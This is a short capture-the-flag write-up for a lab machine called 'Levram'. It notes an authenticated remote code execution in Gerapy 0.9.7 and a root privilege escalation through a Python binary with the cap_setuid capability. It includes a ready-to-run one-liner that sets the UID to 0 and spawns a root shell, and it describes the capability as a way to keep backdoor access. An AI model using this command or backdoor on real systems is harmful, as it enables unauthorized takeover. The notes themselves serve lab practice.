# Levram \[Easy]

## Report

Gerapy 0.9.7 on port 8000 is vulnerable to authenticated RCE. On getting a reverse shell, we find that Python has dangerous capabilities set which is abused to become root.

## Cheatsheet

```
./python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Loot

### Enumeration

192.168.60.24

#### 8000

Gerapy v0.9.7

### Attack Vectors

Spider crawl functionality is abused after creating a project I didn't really look into it much tho

### PrivEsc

`~/gerapy/dbs/db.sqlite3`

`/usr/bin/python3.10 cap_setuid=ep`

### Creds

None

### Proof

If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
